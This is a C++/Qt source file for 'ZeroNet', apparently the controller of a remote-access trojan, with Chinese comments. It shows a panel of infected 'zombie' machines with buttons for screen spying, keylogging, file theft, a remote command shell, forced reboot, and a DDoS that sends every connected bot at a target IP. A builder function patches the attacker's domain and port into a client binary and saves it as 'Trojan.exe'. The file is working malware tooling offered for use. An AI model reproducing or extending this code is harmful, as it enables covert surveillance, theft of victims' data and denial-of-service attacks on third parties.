#include "widget.h"
#include "ui_widget.h"


Widget::Widget(QWidget *parent) :
    QWidget(parent),
    ui(new Ui::Widget)
{
    ui->setupUi(this);

    // 先设置窗口的头相，资源图片在上面下载
    this->setWindowIcon(QIcon(":/resources/zero.ico"));
    this->setWindowTitle("ZeroNet");

    // 设置窗口大小
    const int w = 750, h = 500;
    // 将窗口至中，你必须在widget.h里#include <QDesktopWidget>
    // 以后我就不再多说了，没有include的类就自己在.h文件里include
    const int x = (QApplication::desktop()->width() - w)/2;
    const int y = (QApplication::desktop()->height() - h)/2;
    this->setGeometry(x, y, w, h);
    //不允许最大化最小化？
    this->setMaximumSize(QSize(w, h));
    this->setMinimumSize(QSize(w, h));

    // 设置按钮，暂定四个主要功能（屏幕监控，键盘监控，文件盗取，命令行控制）
    // 其他功能以后有需要再加
    QPushButton *btScreenSpy = new QPushButton(QIcon(":/resources/screenspy.png"),"屏幕监控", this);
    btScreenSpy->setIconSize(QSize(60,60));
    // 建立响应点击信息，函数你需要在widget.h里增加
    connect(btScreenSpy, SIGNAL(clicked(bool)), this, SLOT(screenSpyClicked()));
    btScreenSpy->setGeometry(0,0,150, 100);

    QPushButton *btKeyboardSpy = new QPushButton(QIcon(":/resources/keyboardspy.png"),"键盘监控", this);
    btKeyboardSpy->setIconSize(QSize(60,60));
    connect(btKeyboardSpy, SIGNAL(clicked(bool)), this, SLOT(keyboardClicked()));
    btKeyboardSpy->setGeometry(150,0,150,100);

    QPushButton *btFileSpy = new QPushButton(QIcon(":/resources/filespy.png"),"文件监控", this);
    btFileSpy->setIconSize(QSize(60,60));
    connect(btFileSpy, SIGNAL(clicked(bool)), this, SLOT(fileSpyClicked()));
    btFileSpy->setGeometry(2*150,0,150,100);

    QPushButton *btCmdSpy = new QPushButton(QIcon(":/resources/cmdspy.png"),"命令行控制", this);
    btCmdSpy->setIconSize(QSize(60,60));
    connect(btCmdSpy, SIGNAL(clicked(bool)), this, SLOT(cmdSpyClicked()));
    btCmdSpy->setGeometry(3*150,0,150, 100);


    //添加一个拒绝服务攻击（DDOS）功能图标
    QPushButton *btddos = new QPushButton(QIcon(":/resources/ddos.png"),"拒绝服务攻击", this);
    btddos->setIconSize(QSize(60,60));
    connect(btddos, SIGNAL(clicked(bool)), this, SLOT(cmdDdosClicked()));
    btddos->setGeometry(4*150,0,150, 100);

    // 设置QTableWiget来存放上线客户的信息
    mClientTable = new QTableWidget(this);
    mClientTable->setGeometry(0,100,600,500);
    mClientTable->setColumnCount(6);
    mClientTable->setHorizontalHeaderItem(0, new QTableWidgetItem("id"));
    mClientTable->setColumnWidth(0, 60);
    mClientTable->setHorizontalHeaderItem(1, new QTableWidgetItem("user"));
    mClientTable->setColumnWidth(1, 120);
    mClientTable->setHorizontalHeaderItem(2, new QTableWidgetItem("ip"));
    mClientTable->setColumnWidth(2, 120);
    mClientTable->setHorizontalHeaderItem(3, new QTableWidgetItem("port"));
    mClientTable->setColumnWidth(3, 60);
    mClientTable->setHorizontalHeaderItem(4, new QTableWidgetItem("system"));
    mClientTable->setColumnWidth(4, 140);
    //添加一条信息解析IP显示城市
    mClientTable->setHorizontalHeaderItem(5, new QTableWidgetItem("city"));
    mClientTable->setColumnWidth(5,100);
    // 设置选中一整行
    mClientTable->setSelectionBehavior(QAbstractItemView::SelectRows);
    // 设置一次最多能选中一样
    mClientTable->setSelectionMode(QAbstractItemView::SingleSelection);
    // 设置不能修改
    mClientTable->setEditTriggers(QAbstractItemView::NoEditTriggers);

    // 增加三个槽函数在这个类
    // 增加客户到列表函数：addClientToTable(id, 电脑名, ip, 端口, 系统型号);
    // 从列表中删除客户：removeClientFromTable(id);
    // 获取当前客户ID： currentClientIdFromTable();

    // 当右击客户列表时弹出的操作菜单，比如重启客户的电脑
    mPopupMenu = new QMenu(this);
    QAction *actSendMessage = mPopupMenu->addAction("发送弹窗");
    connect(actSendMessage,SIGNAL(triggered(bool)), this, SLOT(sendMessageClicked()));
    QAction *actReboot = mPopupMenu->addAction("重新开机");
    connect(actReboot,SIGNAL(triggered(bool)), this,SLOT(rebootClicked()));
    QAction *actQuit = mPopupMenu->addAction("强制下线");
    connect(actQuit, SIGNAL(triggered(bool)), this, SLOT(quitClicked()));
    //添加关于按钮
    QAction *actAbout = mPopupMenu->addAction("关于");
    connect(actAbout, SIGNAL(triggered(bool)), this, SLOT(aboutClicked()));

    // 在列表中增加鼠标事件监控，当右击点下时就能弹出菜单
    mClientTable->installEventFilter(this);

    // 服务器控制控件

    //DDOS目标设置
    QLabel *lbDdos = new QLabel("攻击IP:",this);
    lbDdos->setGeometry(610,130,60,30);
    mEditDdos = new QLineEdit(this);
    mEditDdos->setText("127.0.0.1");
    mEditDdos->setMaxLength(80);
    mEditDdos->setGeometry(660,130,70,30);

    // 域名设置
    QLabel *lbDomain =  new QLabel("域名:", this);
    lbDomain->setGeometry(630,330,30,30);
    mEditDomain = new QLineEdit(this);
    mEditDomain->setText("127.0.0.1");
    mEditDomain->setMaxLength(80);
    mEditDomain->setGeometry(660,330,70,30);

    // 端口设置
    QLabel *lbPort=  new QLabel("端口:", this);
    lbPort->setGeometry(630,370,30,30);
    mEditPort = new QLineEdit(this);
    mEditPort->setText("18000");
    mEditPort->setValidator(new QIntValidator(1,65535));
    mEditPort->setGeometry(660,370,70,30);

    // 开始服务端
    mBtStartServer = new QPushButton("开启服务端",this);
    connect(mBtStartServer, SIGNAL(clicked(bool)), this, SLOT(startServer()));
    mBtStartServer->setGeometry(630,410, 100,30);
    // 创建客户端
    QPushButton *btCreateClient = new QPushButton("创建客户端",this);
    connect(btCreateClient, SIGNAL(clicked(bool)), this, SLOT(createClient()));
    btCreateClient->setGeometry(630,450, 100,30);

    // 初始化服务端
    mZeroServer = new ZeroServer(this);
    connect(mZeroServer, SIGNAL(clientLogin(int,QString,QString,int,QString)),
            this, SLOT(addClientToTable(int,QString,QString,int,QString)));
    connect(mZeroServer, SIGNAL(clientLogout(int)), this, SLOT(removeClientFromTable(int)));
}

Widget::~Widget()
{
    delete ui;
}

void Widget::screenSpyClicked()
{
    int id = currentClientIdFromTable();
    if (id != -1) {
        ScreenSpy *ss = new ScreenSpy();
        ZeroClient *client = mZeroServer->client(id);
        int port = ss->startScreenSpyServer(QString::number(id));

        // 开始监控
        client->sendScreenSpy(port);
    }
}

void Widget::keyboardClicked()
{
    int id = currentClientIdFromTable();
    if (id != -1) {
        KeyboardSpy *ks = new KeyboardSpy();
        ZeroClient *client = mZeroServer->client(id);
        int port = ks->startKeyboardSpyServer(QString::number(id));

        // 开始监控
        client->sendKeyboardSpy(port);
    }
}

void Widget::fileSpyClicked()
{
    int id = currentClientIdFromTable();
    if (id != -1) {
        FileSpy *fs = new FileSpy();
        ZeroClient *client = mZeroServer->client(id);
        int port = fs->startFileSpyServer(QString::number(id));

        // 开始监控
        client->sendFileSpy(port);
    }
}

void Widget::cmdSpyClicked()
{
    int id = currentClientIdFromTable();
    if (id != -1) {
        CmdSpy *cs = new CmdSpy();
        ZeroClient *client = mZeroServer->client(id);
        int port = cs->startCmdSpyServer(QString::number(id));

        // 开始监控
        client->sendCmdSpy(port);
    }
}

void Widget::cmdDdosClicked()
{
    int id = mClientTable->rowCount();
    if (id != 0)
    {
        for(int ddosid=1 ; ddosid <= id ; ddosid++)
        {
            DdosSpy *ds= new DdosSpy();
            ZeroClient *client = mZeroServer->client(ddosid);
            int port = ds->startDdosSpyServer(QString::number(ddosid));

            //开始DDOS
            client->sendDdosSpy(port);

            //发送目标IP地址
            QString ATK_IP=mEditDdos->text();
            ds->sendCommand(ATK_IP);
        }
    }
    else
    {
        qDebug() << "DDOS 需要肉鸡的，亲";
    }
}

void Widget::sendMessageClicked()
{
    // 获取当前用户id
    int id = currentClientIdFromTable();
    if (id != -1)
    {
        bool isSend;
        QString text = QInputDialog::getText(this,
                                             QString("发送信息至%0号客户").arg(id),
                                             "请输入你要在客户端弹出的窗口信息",
                                             QLineEdit::Normal,
                                             "",
                                             &isSend);

        // 发送
        if (isSend)
        {
            ZeroClient *client = mZeroServer->client(id);
            client->sendMessage(text);
        }
    }
    else
    {
        qDebug() << "没机机在线你发个屁消息啊";
    }
}

void Widget::rebootClicked()
{
    // 获取当前用户id
    int id = currentClientIdFromTable();
    if (id != -1)
    {
        if(QMessageBox::Yes==QMessageBox::question(this,
                              tr("问一哈"),
                              tr("真的要重启这台肉鸡吗"),
                              QMessageBox::Yes | QMessageBox::No,
                              QMessageBox::Yes))
        {
            ZeroClient *client = mZeroServer->client(id);
            client->sendReboot();
        }
    }
    else
    {
        qDebug() << "没机机你重启个屁啊";
    }
}

void Widget::quitClicked()
{
    // 获取当前用户id
    int id = currentClientIdFromTable();
    if (id != -1)
    {
        if(QMessageBox::Yes==QMessageBox::question(this,
                              tr("问一哈"),
                              tr("真的要下线这台肉鸡吗"),
                              QMessageBox::Yes | QMessageBox::No,
                              QMessageBox::Yes))
        {
            ZeroClient *client = mZeroServer->client(id);
            client->sendQuit();
            qDebug() << "主人我下线了";
        }
    }
    else
    {
        qDebug() << "没机机你下线个屁啊";
    }
}

//槽函数
void Widget::aboutClicked()
{
    QMessageBox::about(this, tr("Name"), tr("Joliph & hhd & wdd"));
}

void Widget::addClientToTable(int id, QString name, QString ip, int port, QString systemInfo)
{
    int count = mClientTable->rowCount();
    mClientTable->setRowCount(count+1);

    QTableWidgetItem *itemId = new QTableWidgetItem(QString::number(id));
    mClientTable->setItem(count, 0 , itemId);

    QTableWidgetItem *itemName = new QTableWidgetItem(name);
    mClientTable->setItem(count, 1 , itemName );

    QTableWidgetItem *itemIp = new QTableWidgetItem(ip);
    mClientTable->setItem(count, 2 , itemIp);

    QTableWidgetItem *itemPort = new QTableWidgetItem(QString::number(port));
    mClientTable->setItem(count, 3 , itemPort);

    QTableWidgetItem *itemSystemInfo = new QTableWidgetItem(systemInfo);
    mClientTable->setItem(count, 4 , itemSystemInfo);

    QString Location="北京";  //通过ip查询，暂时没写
    QTableWidgetItem *itemLocation = new QTableWidgetItem(Location);
    mClientTable->setItem(count, 5 , itemLocation);
}

void Widget::removeClientFromTable(int id)
{
    // 用ID判断该删除的行索引
    int count = mClientTable->rowCount();
    for (int i =0; i< count; ++i) {
        if (mClientTable->item(i, 0)->text().toInt() == id) {
            // 删除
            mClientTable->removeRow(i);
            break;
        }
    }
}

int Widget::currentClientIdFromTable()
{
    int index = mClientTable->currentRow();
    if (index == -1) {
        return -1;
    }
    return mClientTable->item(index, 0)->text().toInt();
}

bool Widget::eventFilter(QObject *watched, QEvent *event)
{
    // 右键弹出菜单
    if (watched==(QObject*)mClientTable) {
        if (event->type() == QEvent::ContextMenu) {
            mPopupMenu->exec(QCursor::pos());
        }
    }

    return QObject::eventFilter(watched, event);
}

void Widget::startServer()
{
    if (mZeroServer->server()->server()->isListening()) {
        mZeroServer->stop();
        mBtStartServer->setText("开启服务端");
        mEditPort->setReadOnly(false);
    } else {
        mZeroServer->start(mEditPort->text().toInt());
        if (mZeroServer->server()->server()->isListening()) {
            QMessageBox::information(this,"提示","开启服务端成功");
            mBtStartServer->setText("停止服务端");
            mEditPort->setReadOnly(true);
        } else {
            QMessageBox::warning(this, "提示", "开启服务端失败");
        }
    }
}

void Widget::createClient()
{
    // 读取ZeroClient.exe文件
    const QString fileName = "ZeroClient.exe";


    QFile file(fileName);
    if (!file.exists()) {
        QMessageBox::warning(this, "提示","请将编译好的ZeroClient.exe放到本程序的目录下");
        return;
    }

    // 获取保存客户端的位置
    QString saveFileName = QFileDialog::getSaveFileName(this, "保存自定义客户端",
                                                        QDir::current().absoluteFilePath("Trojan.exe"),"应用程序(*.exe)",
                                                        0, QFileDialog::ShowDirsOnly);

    if (saveFileName.size() <= 0) {
        return;
    }

    // 打开ZeroClient.exe
    if (!file.open(QFile::ReadOnly)) {
        QMessageBox::warning(this, "提示","无法打开ZeroClient.exe");
        return;
    }

    QByteArray fileData = file.readAll();

    // 关闭文件
    file.close();

    // 自定义客户端的连向的域名和端口
    const int offsetDomain = 10;
    const char domain[100] = "DNSDNSDNS:\0";
    const int offsetPort = 13;
    const char port[100] = "PORTPORTPORT:\0";

    // 自定义域名
    int domainPos = fileData.indexOf(domain);
    if (domainPos == -1) {
        QMessageBox::warning(this, "提示","无法创建客户端，因为无法找到\'DNSDNSDNS:\'的位置");
        return;
    }
    domainPos += offsetDomain;

    QByteArray afterDomain;
    afterDomain.append(mEditDomain->text());
    fileData.replace(domainPos, afterDomain.size(), afterDomain);

    // 自定义端口
    int portPos = fileData.indexOf(port);
    if (portPos == -1) {
        QMessageBox::warning(this, "提示","无法创建客户端，因为无法找到\'PORTPORTPORT:\'的位置");
        return;
    }
    portPos += offsetPort;

    QByteArray afterPort;
    afterPort.append(mEditPort->text()+" ");
    fileData.replace(portPos, afterPort.size(), afterPort);

    // 保存文件
    QFile saveFile(saveFileName);
    if (!saveFile.open(QFile::WriteOnly)) {
        QMessageBox::warning(this, "提示","无法打开"+saveFileName);
        return;
    }
    saveFile.write(fileData.data(), fileData.size());

    saveFile.flush();
    saveFile.close();
}

